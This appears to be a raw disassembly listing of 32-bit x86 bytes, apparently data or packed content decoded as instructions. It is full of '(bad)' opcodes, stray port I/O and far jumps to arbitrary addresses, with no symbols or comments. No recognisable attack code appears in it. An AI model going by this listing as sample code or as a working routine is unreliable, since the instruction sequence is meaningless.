  418f76:	fild   QWORD PTR [edi]
  418f78:	jae    0x418f5f
  418f7a:	inc    esp
  418f7b:	arpl   WORD PTR [ebx],sp
  418f7d:	out    0x95,eax
  418f7f:	jno    0x418f6e
  418f81:	xchg   al,bh
  418f83:	and    eax,0x43eda519
  418f88:	and    DWORD PTR [eax+ecx*4-0x6a19ef85],esp
  418f8f:	mov    al,ds:0x0
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x64eaf1a7]
  419001:	cmp    eax,0x8b40c9c
  419006:	add    DWORD PTR [eax],eax
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	sub    BYTE PTR [eax-0x61],bh
  41900f:	mov    edi,0x93c26348
  419014:	test   DWORD PTR [edi-0x254e9735],edi
  41901a:	pop    edx
  41901b:	jmp    FWORD PTR [edi+edi*8-0x2239973]
  419022:	inc    ebx
  419023:	pop    ss
  419024:	hlt    
  419025:	loopne 0x418fcb
  419027:	push   ebx
  419028:	xchg   esi,eax
  419029:	pop    eax
  41902a:	jl     0x419057
  41902c:	repnz das 
  41902e:	pop    eax
  41902f:	stos   DWORD PTR es:[edi],eax
  419030:	pop    edi
  419031:	adc    BYTE PTR [edx],bl
  419033:	dec    ebx
  419034:	push   si
  419036:	inc    esp
  419037:	jp     0x419006
  419039:	jmp    FWORD PTR [eax]
  41903b:	pusha  
  41903c:	jne    0x419098
  41903e:	or     BYTE PTR [esi-0x18],ch
  419041:	mul    DWORD PTR [eax]
  419043:	sub    eax,0x176b632d
  419048:	js     0x4190a9
  41904a:	dec    BYTE PTR [esi+0x22]
  41904d:	inc    esp
  41904e:	push   edx
  41904f:	xor    edx,DWORD PTR [ebx+0x17]
  419052:	outs   dx,BYTE PTR ds:[esi]
  419053:	test   BYTE PTR [esi-0x4168d58],al
  419059:	adc    al,0xe5
  41905b:	(bad)  
  41905c:	fist   WORD PTR [esi+0x0]
  41905f:	lods   eax,DWORD PTR ds:[esi]
  419060:	outs   dx,BYTE PTR ds:[esi]
  419061:	addr16 adc eax,0xc770397b
  419067:	or     al,0x4e
  419069:	xchg   esp,eax
  41906a:	push   es
  41906b:	out    0xc1,al
  41906d:	repnz jmp 0x44fe:0xa53abb
  419075:	sbb    al,BYTE PTR [esi-0x70]
  419078:	loopne 0x41901f
  41907a:	gs sub eax,0x2af2801b
  419080:	xchg   esi,eax
  419081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419082:	jae    0x4190fb
  419084:	es sbb ah,dl
  419087:	pop    eax
  419088:	loope  0x4190f2
  41908a:	push   ecx
  41908b:	rcr    BYTE PTR [eax-0x45e2954c],1
  419091:	aam    0x61
  419093:	hlt    
  419094:	ror    DWORD PTR ds:0xf448cc74,1
  41909a:	adc    BYTE PTR [esi+0x1b],bh
  41909d:	(bad)  
  41909e:	aam    0xe4
  4190a0:	xor    al,0xd1
  4190a2:	adc    BYTE PTR [esi],dh
  4190a4:	aas    
  4190a5:	sbb    BYTE PTR [esp+edi*8+0x11fcf8be],bl
  4190ac:	call   0x5361:0xd513dbf7
  4190b3:	loopne 0x41912b
  4190b5:	fld    QWORD PTR [esi+ecx*2+0xe]
  4190b9:	adc    DWORD PTR [ecx],edx
  4190bb:	push   ss
  4190bc:	cdq    
  4190bd:	sbb    ch,BYTE PTR [ebx]
  4190bf:	xchg   esi,eax
  4190c0:	into   
  4190c1:	jl     0x419135
  4190c3:	out    0x5e,eax
  4190c5:	mov    dl,0xf8
  4190c7:	xchg   ebp,eax
  4190c8:	sub    esp,DWORD PTR ds:0xf48015c2
  4190ce:	mov    cl,0x2e
  4190d0:	in     eax,dx
  4190d1:	fs (bad) 
  4190d4:	mov    BYTE PTR [esp+edi*2-0x37c057f7],ch
  4190db:	mov    al,ds:0x3e2bd909
  4190e0:	out    0xd8,eax
  4190e2:	push   ebp
  4190e3:	cwde   
  4190e4:	aas    
  4190e5:	or     cl,BYTE PTR [ebx-0x641c17e8]
  4190eb:	(bad)  
  4190ec:	adc    BYTE PTR [esi-0x49f2bec4],al
  4190f2:	sbb    esi,ebx
  4190f4:	adc    BYTE PTR [eax-0xf87fce6],ch
  4190fa:	enter  0x4d8f,0xe4
  4190fe:	mov    cl,0x5d
  419100:	sub    dh,BYTE PTR [esi]
  419102:	js     0x4190d0
  419104:	jmp    0x419107
  419106:	out    dx,al
  419107:	clc    
  419108:	push   edx
  419109:	mov    BYTE PTR [ebx],bh
  41910b:	xchg   DWORD PTR [esi],ebx
  41910d:	leave  
  41910e:	outs   dx,BYTE PTR ds:[esi]
  41910f:	ins    DWORD PTR es:[edi],dx
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ch,BYTE PTR [ebx-0x47867cee]
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	fistp  QWORD PTR [ebx+0x5a681f00]
  419192:	mov    eax,ds:0xb452edd8
  419197:	cmp    BYTE PTR [ecx+ebx*4],cl
  41919a:	or     eax,0xf4595ae0
  41919f:	mov    BYTE PTR [edx+ebp*1-0x9e0d411],dl
  4191a6:	mov    eax,0x4f69fe6f
  4191ab:	or     DWORD PTR [eax-0x287a2673],ecx
  4191b1:	das    
  4191b2:	jmp    FWORD PTR [esi-0x3cf94783]
  4191b8:	push   ss
  4191b9:	outs   dx,DWORD PTR ds:[esi]
  4191ba:	fld    TBYTE PTR [esi]
  4191bc:	adc    DWORD PTR ds:0x529e04ed,ebx
  4191c2:	ins    BYTE PTR es:[edi],dx
  4191c3:	fdivrp st(4),st
  4191c5:	mov    edx,ds
  4191c7:	into   
  4191c8:	dec    ecx
  4191c9:	cs dec si
  4191cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191cd:	and    eax,0x82de2cc6
  4191d2:	sub    eax,DWORD PTR fs:[ecx]
  4191d5:	xchg   ch,dl
  4191d7:	push   ebp
  4191d8:	and    eax,0x263393a1
  4191dd:	aad    0x2d
  4191df:	cdq    
  4191e0:	mov    ecx,0x289b3096
  4191e5:	repnz rcr esi,cl
  4191e8:	punpcklwd mm6,DWORD PTR [edx-0x34]
  4191ec:	add    ecx,0x1a4d2708
  4191f2:	int3   
  4191f3:	jmp    FWORD PTR [ebx+ebx*2-0x263aeaa2]
  4191fa:	ins    DWORD PTR es:[edi],dx
  4191fb:	mov    ebp,0xd4cfffb3
  419200:	ficomp DWORD PTR [ebx-0x2e]
  419203:	jmp    0x97a8:0x27c4d5e2
  41920a:	shl    DWORD PTR [edx+ebp*2],1
  41920d:	mov    dh,0xd5
  41920f:	cmp    eax,0x1d5f7eee
  419214:	pop    ebx
  419215:	mov    al,ds:0xb39e9e96
  41921a:	ja     0x419282
  41921c:	out    dx,eax
  41921d:	mov    al,ds:0x49ba1d1f
  419222:	repnz sbb dl,BYTE PTR [esi+0x24]
  419226:	inc    esi
  419227:	push   esp
  419228:	cmp    al,0xc9
  41922a:	and    BYTE PTR [eax+0x1ea3b887],bh
  419230:	mov    eax,0x9ad2005f
  419235:	mov    al,ds:0xad90938
  41923a:	add    ah,BYTE PTR [edi+ecx*1]
  41923d:	pop    ss
  41923e:	mov    ebx,0x9b8d53e2
  419243:	fcmovu st,st(1)
  419245:	xor    al,0x4
  419247:	mov    ebp,0x5afb6274
  41924c:	xchg   ebx,eax
  41924d:	mov    ah,0x69
  41924f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419250:	pop    esi
  419251:	daa    
  419252:	(bad)  
  419253:	bsf    ecx,ecx
  419256:	adc    eax,0xcb8c9774
  41925b:	lahf   
  41925c:	aad    0x97
  41925e:	clc    
  41925f:	(bad)  [edx+0x75c997c1]
  419265:	sub    ah,BYTE PTR [esi+eax*4-0x3]
  419269:	or     BYTE PTR [eax+0x63],0xf9
  41926d:	pusha  
  41926e:	loope  0x41921b
  419270:	les    edi,FWORD PTR [ebx+0x60671631]
  419276:	add    ebp,DWORD PTR [edi+0x21c75e17]
  41927c:	(bad)  
  41927d:	jg     0x41925f
  41927f:	ficom  DWORD PTR [ebp-0x18]
  419282:	push   ecx
  419283:	test   DWORD PTR [eax+0x2f],esi
  419286:	adc    al,0x91
  419288:	xlat   BYTE PTR ds:[ebx]
  419289:	pushf  
  41928a:	aad    0x13
  41928c:	rol    DWORD PTR [ebx-0x5c],1
  41928f:	inc    eax
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	adc    al,0x5
  419302:	xchg   ecx,eax
  419303:	xchg   BYTE PTR [edx+ecx*1+0x1040001],bh
  41930a:	add    BYTE PTR [eax],al
  41930c:	rol    DWORD PTR [ebx+0x57],1
  41930f:	push   ebx
  419310:	adc    al,0xf7
  419312:	sar    BYTE PTR [esi],1
  419314:	push   ds
  419315:	pop    ds
  419316:	pop    edx
  419317:	pusha  
  419318:	fiadd  WORD PTR [ecx-0x62]
  41931b:	mov    eax,ds:0x98403c2f
  419320:	stc    
  419321:	shr    DWORD PTR [esp+edx*1-0x5f],cl
  419325:	pop    edx
  419326:	sbb    eax,0x36ed3ed5
  41932b:	out    dx,eax
  41932c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41932d:	pop    ebp
  41932e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41932f:	pop    ebx
  419330:	shl    ch,cl
  419332:	test   eax,0xba15a4b1
  419337:	dec    edi
  419338:	sub    ebp,edi
  41933a:	jle    0x4192cf
  41933c:	push   0xffffffa3
  41933e:	in     eax,0x21
  419340:	mov    eax,ds:0x3fdedb5f
  419345:	dec    ebx
  419346:	ror    DWORD PTR [ebp+0x3],1
  419349:	call   0xaa688156
  41934e:	or     al,0x73
  419350:	jno    0x4193bd
  419352:	pop    esi
  419353:	fist   WORD PTR [ebp-0x20c22e38]
  419359:	add    ecx,esp
  41935b:	in     eax,0x31
  41935d:	retf   0xf158
  419360:	std    
  419361:	mov    al,0xf9
  419363:	or     al,0xc9
  419365:	sbb    ebp,edi
  419367:	test   al,0x42
  419369:	push   esp
  41936a:	xlat   BYTE PTR ds:[ebx]
  41936b:	xor    al,0xee
  41936d:	and    ebx,edi
  41936f:	jae    0x4193c7
  419371:	inc    edi
  419372:	cld    
  419373:	into   
  419374:	inc    ebp
  419375:	mov    cl,0x78
  419377:	std    
  419378:	xor    eax,0x5738bf6e
  41937d:	mov    esi,0xa8e79cb8
  419382:	stc    
  419383:	and    eax,0x6be1fc74
  419388:	out    0xce,eax
  41938a:	adc    al,0x40
  41938c:	fdivr  QWORD PTR [ecx-0x4d]
  41938f:	test   al,0x3e
  419391:	fsubr  QWORD PTR [edx-0x40]
  419394:	retf   
  419395:	adc    bl,BYTE PTR [ecx]
  419397:	aas    
  419398:	pop    edi
  419399:	xchg   DWORD PTR [ecx-0x7886626b],edx
  41939f:	push   edi
  4193a0:	fucom  st(0)
  4193a2:	pop    ecx
  4193a3:	neg    BYTE PTR [ebx]
  4193a5:	jb     0x419367
  4193a7:	add    bh,BYTE PTR [edx+0x51]
  4193aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ab:	cmp    DWORD PTR [edi+0x37],esp
  4193ae:	aad    0xe8
  4193b0:	into   
  4193b1:	push   esi
  4193b2:	xchg   BYTE PTR [esi-0x57],bl
  4193b5:	jecxz  0x4193e3
  4193b7:	aam    0x59
  4193b9:	push   ds
  4193ba:	inc    ebp
  4193bb:	loop   0x419375
  4193bd:	jp     0x419384
  4193bf:	and    DWORD PTR [ebp-0x5d],ebx
  4193c2:	mov    ds,edi
  4193c4:	(bad)  
  4193c5:	out    0x3c,al
  4193c7:	and    BYTE PTR [ebp+0x7607f06],ch
  4193cd:	jge    0x41940b
  4193cf:	int3   
  4193d0:	mov    dl,0x89
  4193d2:	lds    edi,FWORD PTR [eax]
  4193d4:	jb     0x4193fa
  4193d6:	xchg   edi,eax
  4193d7:	iret   
  4193d8:	mov    ecx,esp
  4193da:	ret    0x14a
  4193dd:	jne    0x419443
  4193df:	jns    0x4193ae
  4193e1:	jns    0x4193b7
  4193e3:	xchg   ebp,eax
  4193e4:	sbb    BYTE PTR es:[ebp-0x6c705471],cl
  4193eb:	cld    
  4193ec:	clc    
  4193ed:	sti    
  4193ee:	test   al,0x47
  4193f0:	call   0xb7df:0x8dabddaa
  4193f7:	call   0xb9c9:0x48fbbc3e
  4193fe:	lahf   
  4193ff:	addr16 push ebx
  419401:	bound  edx,QWORD PTR [ebp-0x9eabf2a]
  419407:	mov    ecx,0x73e13253
  41940c:	jbe    0x4193d5
  41940e:	add    cl,ch
	...
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	bound  esp,QWORD PTR [ecx+0xbc06edd]
  419486:	add    DWORD PTR [eax],eax
  419488:	add    al,0x1
  41948a:	add    BYTE PTR [eax],al
  41948c:	xor    al,0x4e
  41948e:	(bad)  
  41948f:	fsubr  st(6),st
  419491:	sub    eax,0xb4ba3b00
  419496:	add    ebp,DWORD PTR [ecx]
  419498:	jle    0x4194c0
  41949a:	xchg   ebp,eax
  41949b:	cmc    
  41949c:	cmp    al,0x52
  41949e:	xchg   edx,eax
  41949f:	jnp    0x4194d9
  4194a1:	pop    DWORD PTR [esi+edi*8]
  4194a4:	cmp    BYTE PTR [esi],bl
  4194a6:	rcl    DWORD PTR [ecx-0x7],0xdd
  4194aa:	cmp    esp,DWORD PTR ds:0x89cf5381
  4194b0:	int    0xc6
  4194b2:	dec    edx
  4194b3:	mov    WORD PTR [eax],es
  4194b5:	mov    edi,DWORD PTR [ebx]
  4194b7:	jg     0x4194f1
  4194b9:	push   esi
  4194ba:	sub    eax,0xbb44a991
  4194bf:	lods   eax,DWORD PTR ds:[esi]
  4194c0:	adc    DWORD PTR [edx+edx*1-0x69],ebp
  4194c4:	in     eax,dx
  4194c5:	into   
  4194c6:	push   es
  4194c7:	(bad)  [ebx]
  4194c9:	or     dh,ch
  4194cb:	push   ds
  4194cc:	mov    gs:0xe783fc4c,al
  4194d2:	add    eax,0x96e6b218
  4194d7:	pop    edi
  4194d8:	add    eax,0xe000580a
  4194dd:	ret    
  4194de:	xor    al,0x5
  4194e0:	pop    edx
  4194e1:	fdiv   st,st(2)
  4194e3:	dec    ebp
  4194e4:	sbb    dl,BYTE PTR [edx]
  4194e6:	bswap  eax
  4194e8:	sbb    eax,DWORD PTR [eax]
  4194ea:	add    ebx,esp
  4194ec:	repnz mov dl,0x35
  4194ef:	mov    al,ds:0x9540cbd0
  4194f4:	das    
  4194f5:	fs sub edx,edi
  4194f8:	xor    dl,0x2d
  4194fb:	mov    eax,0xaba629f6
  419500:	pop    ebp
  419501:	out    0x20,al
  419503:	mov    ?,WORD PTR [ecx+0x61ac1c3f]
  419509:	mov    WORD PTR [esi+0x5],es
  41950c:	mov    ds:0x2c64c4e0,eax
  419511:	ins    DWORD PTR es:[edi],dx
  419512:	ret    0x1e42
  419515:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  419517:	cmp    ecx,DWORD PTR [esi]
  419519:	or     DWORD PTR [ecx-0x37fd8ca4],esi
  41951f:	pop    edx
  419520:	test   eax,0xc7776bf6
  419525:	add    edx,DWORD PTR [esi-0x4c]
  419528:	xchg   DWORD PTR gs:[edx+0x48],ebp
  41952c:	cli    
  41952d:	xchg   esp,eax
  41952e:	push   0x1
  419530:	les    edi,FWORD PTR [edx+esi*2+0x1d]
  419534:	or     al,0xe3
  419536:	inc    edi
  419537:	loop   0x41955d
  419539:	or     edi,DWORD PTR [eax+ebp*8-0x79]
  41953d:	adc    al,0xd2
  41953f:	push   edx
  419540:	lds    esi,FWORD PTR [edx-0xc]
  419543:	pop    ebx
  419544:	iret   
  419545:	inc    ebx
  419546:	pusha  
  419547:	and    ah,bh
  419549:	fs aad 0x55
  41954c:	mov    bl,0xf0
  41954e:	mov    ebp,0x569c6e06
  419553:	enter  0xf71e,0x7
  419557:	cmp    DWORD PTR ds:0x3a76d252,0x9592f665
  419561:	test   BYTE PTR [edx-0x4cf986dc],ch
  419567:	jecxz  0x419530
  419569:	adc    al,0x5a
  41956b:	mov    al,0x69
  41956d:	dec    ebx
  41956e:	mov    bh,0xfb
  419570:	mov    ebx,0x8ba39d4b
  419575:	addr16 dec ebp
  419577:	mov    eax,ds:0xc9c0a8ee
  41957c:	and    dh,BYTE PTR [ebp+0x7a608e53]
  419582:	push   edi
  419583:	mov    dh,0x45
  419585:	pushf  
  419586:	inc    esi
  419587:	out    0x40,eax
  419589:	shr    DWORD PTR [edx],cl
  41958b:	and    eax,0x86fe1c90
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	(bad)  
  419601:	int3   
  419602:	sbb    cl,BYTE PTR [eax-0x3c]
  419605:	or     al,0x1
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	psubusw mm4,QWORD PTR [ecx]
  41960f:	inc    edi
  419610:	jne    0x419685
  419612:	or     al,0x20
  419614:	and    BYTE PTR [ebx],ch
  419616:	pop    ds
  419617:	imul   edx,DWORD PTR ds:0xa7d9c706,0x28
  41961e:	dec    eax
  41961f:	std    
  419620:	test   BYTE PTR [edx],0x23
  419623:	jb     0x4195f5
  419625:	jno    0x4195e4
  419627:	add    eax,0xf6be85c0
  41962c:	in     eax,0x5c
  41962e:	shr    BYTE PTR [edi],0x78
  419631:	mov    ah,0x8e
  419633:	aam    0xd8
  419635:	or     esp,edx
  419637:	cmp    ebx,ebp
  419639:	adc    eax,0xe7e0f23b
  41963e:	push   esi
  41963f:	js     0x419693
  419641:	xlat   BYTE PTR ds:[ebx]
  419642:	add    al,0x68
  419644:	mov    eax,0x283657c0
  419649:	ret    0xf381
  41964c:	outs   dx,BYTE PTR ds:[esi]
  41964d:	mov    BYTE PTR [ecx+edx*4+0x33],ch
  419651:	jl     0x41967c
  419653:	(bad)  
  419654:	(bad)  
  419655:	mov    bh,0x65
  419657:	in     al,dx
  419658:	ins    DWORD PTR es:[edi],dx
  419659:	sar    DWORD PTR [ebp+0x3f66953d],0x55
  419660:	xchg   esp,eax
  419661:	outs   dx,DWORD PTR ds:[esi]
  419662:	in     eax,0xc3
  419664:	mov    ebp,DWORD PTR [eax]
  419666:	call   0x2ca8:0xed6a6191
  41966d:	fs popa 
  41966f:	push   ss
  419670:	sub    dl,BYTE PTR [edi-0x743c813a]
  419676:	xchg   esi,eax
  419677:	and    al,0xf
  419679:	cmp    DWORD PTR [edx-0x1edfd7ee],edx
  41967f:	mov    ecx,es
  419681:	int3   
  419682:	inc    edi
  419683:	stc    
  419684:	lds    ebp,FWORD PTR [esi+edx*1]
  419687:	or     DWORD PTR [ebx],0x15878df2
  41968d:	and    eax,0x20823fae
  419692:	enter  0x31a5,0x7c
  419696:	mov    esi,0xb418cac6
  41969b:	mov    ah,0x1a
  41969d:	sbb    al,0xb1
  41969f:	(bad)  
  4196a0:	sti    
  4196a1:	stos   DWORD PTR es:[edi],eax
  4196a2:	cmp    ch,0x21
  4196a5:	mov    ds:0xb79d77ca,eax
  4196aa:	sahf   
  4196ab:	imul   ebx,DWORD PTR [ebx],0x9a4b3cff
  4196b1:	inc    ebx
  4196b2:	cmp    DWORD PTR [eax-0xe],ebx
  4196b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b6:	fs inc ebp
  4196b8:	retf   0xbbb7
  4196bb:	outs   dx,DWORD PTR ds:[esi]
  4196bc:	je     0x4196b5
  4196be:	mov    ebp,0x1af62e2c
  4196c3:	out    dx,al
  4196c4:	dec    eax
  4196c5:	pop    esi
  4196c6:	dec    edi
  4196c7:	mov    al,ds:0xb897342
  4196cc:	imul   eax,DWORD PTR [edi],0x2f35bb4e
  4196d2:	xchg   esi,eax
  4196d3:	ret    0x7b31
  4196d6:	add    DWORD PTR [ebp+0x6c],0xffffffd2
  4196da:	mov    ds:0x41537bf0,al
  4196df:	outs   dx,DWORD PTR ds:[esi]
  4196e0:	mov    eax,0x3872fce6
  4196e5:	mov    al,0x96
  4196e7:	aam    0xbc
  4196e9:	add    al,0x1f
  4196eb:	cmp    ecx,DWORD PTR [edx+ebx*2]
  4196ee:	pop    es
  4196ef:	fistp  WORD PTR [edx]
  4196f1:	pop    ecx
  4196f2:	cmp    edi,esi
  4196f4:	lods   eax,DWORD PTR ds:[esi]
  4196f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f6:	mov    cl,0x93
  4196f8:	popf   
  4196f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196fa:	sbb    eax,DWORD PTR [ebp-0x2aee0cd2]
  419700:	inc    ebp
  419701:	mov    al,0x4e
  419703:	mov    ebp,0x2e4871d2
  419708:	jg     0x4196b3
  41970a:	aad    0x6b
  41970c:	stos   BYTE PTR es:[edi],al
  41970d:	ins    BYTE PTR es:[edi],dx
  41970e:	ret    0xc1
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x618dd0ae
  419781:	out    0xf0,eax
  419783:	cld    
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	stos   BYTE PTR es:[edi],al
  41978d:	shl    DWORD PTR [eax+0x5e],cl
  419790:	in     eax,dx
  419791:	(bad)  
  419792:	pop    esp
  419793:	loope  0x419722
  419795:	inc    edi
  419796:	mov    DWORD PTR [ebx-0x3],esp
  419799:	dec    edx
  41979a:	loopne 0x41978d
  41979c:	fld    TBYTE PTR [edx+0x58e7d58e]
  4197a2:	mov    al,ds:0xcfdbff37
  4197a7:	test   DWORD PTR [edx],ecx
  4197a9:	imul   eax,DWORD PTR [eax-0x3a],0xc04533a8
  4197b0:	ds (bad) 
  4197b2:	out    0x87,eax
  4197b4:	fcom   QWORD PTR [ebx-0x1e]
  4197b7:	aam    0xa
  4197b9:	lods   al,BYTE PTR ds:[esi]
  4197ba:	dec    ebx
  4197bb:	cdq    
  4197bc:	out    dx,eax
  4197bd:	sub    bh,bh
  4197bf:	adc    eax,0x2fb53bcd
  4197c4:	std    
  4197c5:	loopne 0x41983b
  4197c7:	xor    BYTE PTR [edi-0x33],0x16
  4197cb:	mov    eax,0xaffaddc7
  4197d0:	jp     0x4197ce
  4197d2:	ins    BYTE PTR es:[edi],dx
  4197d3:	and    al,0x25
  4197d5:	push   ebx
  4197d6:	(bad)  
  4197d7:	xor    ah,dl
  4197d9:	fbld   TBYTE PTR [ecx+0x4a28aac9]
  4197df:	(bad)  
  4197e0:	faddp  st(7),st
  4197e2:	cmp    dl,BYTE PTR [edi]
  4197e4:	je     0x41979e
  4197e6:	adc    eax,0xf3980932
  4197eb:	outs   dx,BYTE PTR ds:[esi]
  4197ec:	adc    eax,0xa2b813b
  4197f1:	repnz out 0xed,al
  4197f4:	leave  
  4197f5:	std    
  4197f6:	outs   dx,DWORD PTR ds:[esi]
  4197f7:	xor    eax,0xe6550bd7
  4197fc:	(bad)  
  4197fd:	and    eax,0x6afc74e5
  419802:	jnp    0x419834
  419804:	jnp    0x41985f
  419806:	inc    eax
  419807:	cli    
  419808:	sbb    edi,esp
  41980a:	std    
  41980b:	test   al,0x72
  41980d:	cli    
  41980e:	mov    dh,0x9a
  419810:	jbe    0x4197f4
  419812:	add    ecx,DWORD PTR [ebx+0x56128740]
  419818:	(bad)  [eax-0x80]
  41981b:	dec    ebx
  41981c:	jle    0x4197e4
  41981e:	sub    al,0xe3
  419820:	pop    edx
  419821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419822:	arpl   WORD PTR [edi],cx
  419824:	sbb    esi,DWORD PTR ds:0xb6f2f524
  41982a:	adc    al,0x83
  41982c:	rol    ch,0x47
  41982f:	dec    edx
  419830:	mov    dl,0x5e
  419832:	cmp    esi,eax
  419834:	pushf  
  419835:	daa    
  419836:	inc    esi
  419837:	push   edi
  419838:	test   al,0x8
  41983a:	xchg   ebp,eax
  41983b:	cmc    
  41983c:	aas    
  41983d:	sub    bh,ch
  41983f:	xchg   esi,esp
  419841:	dec    ecx
  419842:	fsub   st(3),st
  419844:	int    0x63
  419846:	loope  0x41980d
  419848:	xchg   edi,eax
  419849:	es es adc al,0xaa
  41984d:	leave  
  41984e:	shl    BYTE PTR [ebp+0xf],0xf9
  419852:	sub    cl,dl
  419854:	out    0x2a,eax
  419856:	jg     0x4198cd
  419858:	aas    
  419859:	sbb    al,0x2d
  41985b:	adc    DWORD PTR [edx-0x3b1f5168],ebx
  419861:	and    dh,BYTE PTR [eax]
  419863:	dec    ecx
  419864:	icebp  
  419865:	mov    ch,0x68
  419867:	(bad)  
  419868:	pop    esp
  419869:	call   0x1e16e2f
  41986e:	mov    ecx,edx
  419870:	mov    bl,0x44
  419872:	inc    esi
  419873:	inc    ebp
  419874:	mov    bh,0x44
  419876:	aaa    
  419877:	leave  
  419878:	jl     0x41989c
  41987a:	add    ebx,ebp
  41987c:	and    eax,0x7f8210a0
  419881:	mov    ebp,0x4e9a9962
  419886:	int    0xfd
  419888:	aas    
  419889:	arpl   WORD PTR [edi-0x3d31b20a],bp
  41988f:	inc    ecx
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fucomp st(1)
  419901:	cmp    esi,0x10eccd4
  419907:	add    BYTE PTR [ecx+eax*1],al
  41990a:	add    BYTE PTR [eax],al
  41990c:	scas   eax,DWORD PTR es:[edi]
  41990d:	rcl    BYTE PTR [edi-0x780c5f4d],1
  419913:	dec    ebp
  419914:	inc    ebx
  419915:	cmp    eax,0x5d25ec67
  41991a:	sub    BYTE PTR [edi-0x6ce400f3],ch
  419920:	call   0xc0fddb9f
  419925:	jge    0x419940
  419927:	sbb    al,0x6a
  419929:	shl    DWORD PTR [esi-0x9],1
  41992c:	das    
  41992d:	mov    edx,DWORD PTR ds:0xe7fd35
  419933:	test   al,0x62
  419935:	clc    
  419936:	(bad)  
  419937:	xadd   BYTE PTR [ebx-0x1b],bh
  41993b:	loopne 0x419966
  41993d:	loop   0x41992e
  41993f:	xchg   esi,eax
  419940:	push   esp
  419941:	popf   
  419942:	mov    ?,edi
  419944:	mov    edi,0x640a44e8
  419949:	stos   BYTE PTR es:[edi],al
  41994a:	call   esi
  41994c:	repz pop ebp
  41994e:	push   edx
  41994f:	dec    ebp
  419950:	xor    eax,0x1b980dff
  419955:	dec    ecx
  419956:	xor    DWORD PTR ds:0x1f3e264f,edi
  41995c:	jmp    0x419935
  41995e:	sbb    DWORD PTR [ebx+0x361f4dbb],0xb62a4522
  419968:	inc    eax
  419969:	and    al,0x26
  41996b:	ret    0xe709
  41996e:	push   esi
  41996f:	xchg   BYTE PTR [ebp-0x644a8f96],dl
  419975:	inc    edx
  419976:	lods   al,BYTE PTR ds:[esi]
  419977:	sub    BYTE PTR [ecx+ebx*8+0x45],bh
  41997b:	ret    
  41997c:	inc    ebp
  41997d:	or     eax,0xababb264
  419982:	lods   al,BYTE PTR ds:[esi]
  419983:	push   esi
  419984:	jmp    0x4d4d:0x657e30d6
  41998b:	xor    DWORD PTR [ebp-0x326e2336],ebx
  419991:	repz or BYTE PTR [eax],ah
  419994:	pop    edi
  419995:	test   al,0x4
  419997:	pop    ds
  419998:	mov    bl,0xa2
  41999a:	dec    edx
  41999b:	ins    DWORD PTR es:[edi],dx
  41999c:	int3   
  41999d:	js     0x419929
  41999f:	sub    DWORD PTR [eax],esp
  4199a1:	mov    bl,ch
  4199a3:	retf   
  4199a4:	rol    BYTE PTR [esi],cl
  4199a6:	mov    dl,bl
  4199a8:	dec    ebx
  4199a9:	sbb    BYTE PTR [ebx+edi*1],bh
  4199ac:	xlat   BYTE PTR ds:[ebx]
  4199ad:	xchg   edx,eax
  4199ae:	or     eax,0x672e44ac
  4199b3:	or     BYTE PTR [esi-0x64987354],dl
  4199b9:	pop    esp
  4199ba:	popa   
  4199bb:	sar    DWORD PTR [ebp+0x1b],0xfc
  4199bf:	mov    ebx,0x3a7de169
  4199c4:	add    DWORD PTR [ebx-0x53740f41],esi
  4199ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199cb:	into   
  4199cc:	gs pop ebx
  4199ce:	pop    ebx
  4199cf:	out    0xbc,eax
  4199d1:	add    esp,DWORD PTR [ecx-0x7cace92b]
  4199d7:	sti    
  4199d8:	leave  
  4199d9:	dec    esi
  4199da:	ins    BYTE PTR es:[edi],dx
  4199db:	and    edi,edx
  4199dd:	das    
  4199de:	(bad)  
  4199df:	mov    ebp,0x2265c3a6
  4199e4:	sbb    BYTE PTR [esi],cl
  4199e6:	pop    edi
  4199e7:	jae    0x419a67
  4199e9:	sub    eax,0x94602c67
  4199ee:	mov    ds:0x2b53b9d5,al
  4199f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199f4:	dec    edi
  4199f5:	sti    
